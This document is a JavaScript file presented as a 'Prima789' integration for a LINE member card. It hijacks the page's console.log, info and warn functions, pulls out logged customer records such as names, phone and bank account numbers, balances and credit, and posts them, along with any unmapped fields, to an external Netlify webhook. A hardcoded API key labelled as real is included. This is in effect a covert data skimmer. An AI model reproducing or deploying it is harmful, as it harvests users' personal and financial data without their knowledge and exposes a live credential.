/**
 * Prima789 Console Log Integration Script for LINE Member Card
 * Version: 3.0.0 - Console Log Edition
 *
 * ดักข้อมูลจาก console.log ของ Prima789 และส่งไปยัง LINE Member Card System
 */

;(function () {
  'use strict'

  // Configuration
  const CONFIG = {
    WEBHOOK_URL:
      'https://sliffs.netlify.app/.netlify/functions/transaction-webhook',
    API_KEY: 'PRIMA789_f1922de52a8e5c6bf5b4777dabeff027', // ✅ REAL API KEY CONFIGURED
    DEBUG: true,
    VERSION: '3.0.0-console-log-configured',
    RETRY_ATTEMPTS: 3,
    RETRY_DELAY: 2000,
    QUEUE_MAX_SIZE: 100,
    HEARTBEAT_INTERVAL: 30000,
    // Keywords ที่จะตรวจจับใน console.log
    CONSOLE_KEYWORDS: [
      'Login customer_data',
      'customer_data',
      'member_data',
      'user_data',
      'login_data',
      'customer_req_info',
      'credit_push',
    ],
  }

  // Global variables
  let currentUser = null
  let lastBalance = null
  let transactionQueue = []
  let isProcessing = false
  let isInitialized = false
  let originalConsoleLog = null
  let originalConsoleInfo = null
  let originalConsoleWarn = null
  let originalConsoleError = null

  // Logger function
  function log(message, data = null) {
    if (CONFIG.DEBUG) {
      const timestamp = new Date().toISOString()
      if (originalConsoleLog) {
        originalConsoleLog(
          `[Prima789-LINE] ${timestamp}: ${message}`,
          data || ''
        )
      }
    }
  }

  // Initialize console log interceptor
  function initConsoleInterceptor() {
    // Backup original console functions
    originalConsoleLog = console.log.bind(console)
    originalConsoleInfo = console.info.bind(console)
    originalConsoleWarn = console.warn.bind(console)
    originalConsoleError = console.error.bind(console)

    // Override console.log
    console.log = function (...args) {
      // Call original function first
      originalConsoleLog.apply(console, args)

      // Check if this log contains customer data
      interceptConsoleMessage('log', args)
    }

    // Override console.info
    console.info = function (...args) {
      originalConsoleInfo.apply(console, args)
      interceptConsoleMessage('info', args)
    }

    // Override console.warn
    console.warn = function (...args) {
      originalConsoleWarn.apply(console, args)
      interceptConsoleMessage('warn', args)
    }

    log('✅ Console interceptor initialized')
  }

  // Intercept console messages
  function interceptConsoleMessage(type, args) {
    try {
      const message = args.join(' ')

      // Check for customer data keywords
      const hasKeyword = CONFIG.CONSOLE_KEYWORDS.some((keyword) =>
        message.toLowerCase().includes(keyword.toLowerCase())
      )

      if (hasKeyword) {
        log('🎯 Detected customer data in console:', type)
        processConsoleData(args)
      }
    } catch (error) {
      log('❌ Error intercepting console message:', error)
    }
  }

  // Process console data
  function processConsoleData(args) {
    try {
      // ลอง parse ข้อมูลจาก arguments
      for (let i = 0; i < args.length; i++) {
        const arg = args[i]

        // ถ้าเป็น object ที่มีข้อมูลลูกค้า
        if (typeof arg === 'object' && arg !== null) {
          // ตรวจสอบว่ามี property ที่เป็นข้อมูลลูกค้าหรือไม่
          if (isCustomerDataObject(arg)) {
            log('📋 Found customer data object:', arg)
            handleCustomerData(arg)
            return
          }

          // ถ้า object มี nested data
          if (arg.value && typeof arg.value === 'object') {
            if (isCustomerDataObject(arg.value)) {
              log('📋 Found nested customer data:', arg.value)
              handleCustomerData(arg.value)
              return
            }
          }
        }
      }

      // ถ้าไม่เจอ object พยายาม parse string
      const fullMessage = args.join(' ')
      const parsedData = tryParseStringData(fullMessage)
      if (parsedData) {
        log('📋 Parsed customer data from string:', parsedData)
        handleCustomerData(parsedData)
      }
    } catch (error) {
      log('❌ Error processing console data:', error)
    }
  }

  // Check if object is customer data
  function isCustomerDataObject(obj) {
    if (!obj || typeof obj !== 'object') return false

    // Check for Prima789 customer data fields
    const customerFields = [
      'mm_user',
      'acc_no',
      'bank_id',
      'bank_name',
      'first_name',
      'last_name',
      'tel',
      'created_at',
      'available',
      'credit_limit',
      'bet_credit',
      'member_ref',
      'registerTime',
    ]

    const foundFields = customerFields.filter((field) =>
      obj.hasOwnProperty(field)
    )

    // ถ้าพบ field ที่เกี่ยวข้องมากกว่า 2 fields ถือว่าเป็นข้อมูลลูกค้า
    return foundFields.length >= 2
  }

  // Try to parse customer data from string
  function tryParseStringData(str) {
    try {
      // ลองหา JSON pattern ใน string
      const jsonMatch = str.match(/{[^{}]*}/)
      if (jsonMatch) {
        return JSON.parse(jsonMatch[0])
      }

      // ลองหา object pattern
      const objectMatch = str.match(/Object\s*{[^{}]*}/)
      if (objectMatch) {
        // พยายาม extract ข้อมูลจาก object string
        return extractDataFromObjectString(objectMatch[0])
      }
    } catch (error) {
      log('Could not parse string data:', error)
    }
    return null
  }

  // Extract data from object string representation
  function extractDataFromObjectString(objStr) {
    const data = {}

    // Extract patterns like 'field: "value"' or 'field: value'
    const patterns = [
      /(\w+):\s*"([^"]+)"/g, // string values
      /(\w+):\s*(\d+(?:\.\d+)?)/g, // numeric values
      /(\w+):\s*([a-zA-Z0-9_]+)/g, // other values
    ]

    patterns.forEach((pattern) => {
      let match
      while ((match = pattern.exec(objStr)) !== null) {
        const [, key, value] = match
        if (!data[key]) {
          // ไม่เขียนทับถ้ามีแล้ว
          data[key] = isNaN(value) ? value : Number(value)
        }
      }
    })

    return Object.keys(data).length > 0 ? data : null
  }

  // Handle customer data
  function handleCustomerData(customerData) {
    try {
      log('🔄 Processing customer data:', customerData)

      // Normalize data structure
      const normalizedData = normalizeCustomerData(customerData)

      if (!normalizedData.mm_user) {
        log('⚠️ No mm_user found in customer data')
        return
      }

      // Update current user
      const previousUser = currentUser
      currentUser = normalizedData

      // Check if user changed
      if (!previousUser || previousUser.mm_user !== currentUser.mm_user) {
        log('👤 New user detected:', currentUser.mm_user)
        handleUserLogin(currentUser)
      }

      // Check for balance update
      if (normalizedData.available !== undefined) {
        const newBalance = parseFloat(normalizedData.available)
        if (lastBalance !== null && lastBalance !== newBalance) {
          log('💰 Balance changed:', { from: lastBalance, to: newBalance })
          handleBalanceUpdate(lastBalance, newBalance)
        }
        lastBalance = newBalance
      }

      // Send sync data
      sendSyncData(normalizedData)
    } catch (error) {
      log('❌ Error handling customer data:', error)
    }
  }

  // Normalize customer data format
  function normalizeCustomerData(rawData) {
    const normalized = {}

    // Map ข้อมูลที่สำคัญ
    const fieldMapping = {
      mm_user: ['mm_user', 'username', 'user_id'],
      acc_no: ['acc_no', 'account_number', 'tel', 'phone'],
      bank_name: ['bank_name', 'bank'],
      bank_id: ['bank_id'],
      first_name: ['first_name', 'firstname'],
      last_name: ['last_name', 'lastname'],
      available: ['available', 'balance', 'current_balance'],
      credit_limit: ['credit_limit', 'limit'],
      bet_credit: ['bet_credit', 'credit'],
      created_at: ['created_at', 'register_date'],
      registerTime: ['registerTime', 'register_time'],
    }

    // Map fields
    Object.keys(fieldMapping).forEach((targetField) => {
      const sourceFields = fieldMapping[targetField]
      for (const sourceField of sourceFields) {
        if (rawData[sourceField] !== undefined) {
          normalized[targetField] = rawData[sourceField]
          break
        }
      }
    })

    // Copy any unmapped fields
    Object.keys(rawData).forEach((key) => {
      if (!normalized.hasOwnProperty(key) && rawData[key] !== undefined) {
        normalized[key] = rawData[key]
      }
    })

    return normalized
  }

  // Handle user login
  function handleUserLogin(userData) {
    const loginData = {
      transaction_type: 'user_login',
      user_id: userData.mm_user,
      username: userData.mm_user,
      amount: 0,
      balance_before: null,
      balance_after: parseFloat(userData.available) || 0,
      transaction_id: generateTransactionId('login'),
      timestamp: new Date().toISOString(),
      details: {
        source: 'console_log_login',
        user_data: userData,
        first_name: userData.first_name || '',
        last_name: userData.last_name || '',
        phone: userData.acc_no || userData.tel || '',
        bank_name: userData.bank_name || '',
        register_date: userData.created_at || userData.registerTime || '',
      },
    }

    queueTransaction(loginData)
    //showSyncNotification(`เชื่อมต่อ LINE สำเร็จ\nผู้ใช้: ${userData.mm_user}`)
  }

  // Handle balance update
  function handleBalanceUpdate(oldBalance, newBalance) {
    const amount = newBalance - oldBalance

    const balanceData = {
      transaction_type: amount > 0 ? 'deposit' : 'withdrawal',
      user_id: currentUser.mm_user,
      username: currentUser.mm_user,
      amount: Math.abs(amount),
      balance_before: oldBalance,
      balance_after: newBalance,
      transaction_id: generateTransactionId(amount > 0 ? 'dep' : 'wd'),
      timestamp: new Date().toISOString(),
      details: {
        source: 'console_log_balance_update',
        change_amount: amount,
        user_data: currentUser,
      },
    }

    queueTransaction(balanceData)
  }

  // Send sync data
  function sendSyncData(userData) {
    const syncData = {
      transaction_type: 'data_sync',
      user_id: userData.mm_user,
      username: userData.mm_user,
      amount: 0,
      balance_before: lastBalance,
      balance_after: parseFloat(userData.available) || lastBalance || 0,
      transaction_id: generateTransactionId('sync'),
      timestamp: new Date().toISOString(),
      details: {
        source: 'console_log_sync',
        user_data: userData,
        balance: parseFloat(userData.available) || 0,
        credit_limit: userData.credit_limit || 0,
        bet_credit: userData.bet_credit || 0,
      },
    }

    queueTransaction(syncData)
  }

  // Generate transaction ID
  function generateTransactionId(prefix = 'txn') {
    const timestamp = Date.now()
    const random = Math.random().toString(36).substr(2, 5)
    return `${prefix}_${timestamp}_${random}`
  }

  // Queue transaction
  function queueTransaction(transactionData) {
    if (transactionQueue.length >= CONFIG.QUEUE_MAX_SIZE) {
      log('⚠️ Transaction queue full, removing oldest transaction')
      transactionQueue.shift()
    }

    transactionQueue.push(transactionData)
    log('📝 Transaction queued:', transactionData.transaction_type)

    if (!isProcessing) {
      processTransactionQueue()
    }
  }

  // Process transaction queue
  async function processTransactionQueue() {
    if (isProcessing || transactionQueue.length === 0) return

    isProcessing = true
    log(
      '🔄 Processing transaction queue...',
      `${transactionQueue.length} items`
    )

    while (transactionQueue.length > 0) {
      const transaction = transactionQueue.shift()

      try {
        await sendTransactionData(transaction)
        await new Promise((resolve) => setTimeout(resolve, 500)) // Rate limiting
      } catch (error) {
        log('❌ Failed to send transaction:', error)
        // Re-queue failed transaction (max 3 attempts)
        if (!transaction._attempts) transaction._attempts = 0
        if (transaction._attempts < CONFIG.RETRY_ATTEMPTS) {
          transaction._attempts++
          transactionQueue.unshift(transaction)
          await new Promise((resolve) =>
            setTimeout(resolve, CONFIG.RETRY_DELAY)
          )
        }
      }
    }

    isProcessing = false
    log('✅ Transaction queue processed')
  }

  // Send transaction data
  async function sendTransactionData(transactionData) {
    try {
      const response = await fetch(CONFIG.WEBHOOK_URL, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
          'X-API-Key': CONFIG.API_KEY,
          'User-Agent': `Prima789-Console-Integration/${CONFIG.VERSION}`,
        },
        body: JSON.stringify(transactionData),
      })

      if (!response.ok) {
        throw new Error(`HTTP ${response.status}: ${response.statusText}`)
      }

      const result = await response.json()
      log('✅ Transaction sent successfully:', result)

      return result
    } catch (error) {
      log('❌ Error sending transaction:', error)
      throw error
    }
  }

  // Main initialization
  function initPrima789ConsoleIntegration() {
    if (isInitialized) {
      log('⚠️ Prima789 console integration already initialized')
      return
    }

    log('🚀 Initializing Prima789 Console Integration v' + CONFIG.VERSION)

    try {
      initConsoleInterceptor()
      isInitialized = true

      log('✅ Prima789 Console Integration initialized successfully')
    } catch (error) {
      log('❌ Failed to initialize Prima789 Console Integration:', error)
    }
  }

  // Public API
  window.Prima789Console = {
    init: initPrima789ConsoleIntegration,
    getCurrentUser: () => currentUser,
    getLastBalance: () => lastBalance,
    getQueueLength: () => transactionQueue.length,
    isProcessing: () => isProcessing,
    forceSync: () => {
      if (currentUser && currentUser.mm_user) {
        sendSyncData(currentUser)
      }
    },
    getStats: () => ({
      initialized: isInitialized,
      currentUser: currentUser ? currentUser.mm_user : null,
      lastBalance: lastBalance,
      queueLength: transactionQueue.length,
      isProcessing: isProcessing,
    }),
  }

  // Auto-initialize
  if (document.readyState === 'loading') {
    document.addEventListener(
      'DOMContentLoaded',
      initPrima789ConsoleIntegration
    )
  } else {
    setTimeout(initPrima789ConsoleIntegration, 1000)
  }

  log(`Prima789 Console Integration v${CONFIG.VERSION} script loaded`)
})()
